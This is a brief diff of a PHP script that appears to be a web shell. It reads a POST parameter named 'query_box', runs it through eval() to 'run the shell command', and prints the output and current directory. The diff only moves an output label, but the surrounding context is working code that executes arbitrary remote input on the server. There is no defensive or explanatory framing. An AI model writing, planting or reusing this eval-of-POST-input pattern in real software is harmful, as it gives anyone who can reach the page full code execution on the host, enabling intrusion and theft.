@@ -23,9 +23,9 @@ $cwd=getcwd();
 echo "<br>Current directory: $cwd<br>";
 $shell = $_POST['query_box'];
 if (!empty($_POST['query_box'])) {
+	echo "<br><b>Output: </b><br>";
 	//Run the shell command
 	$run = eval($shell);
-	echo "<br><b>Output: </b><br>";
 	echo "<pre>$run</pre>";
 }else{
 	echo "<b>Nothing has been run yet.</b>";	
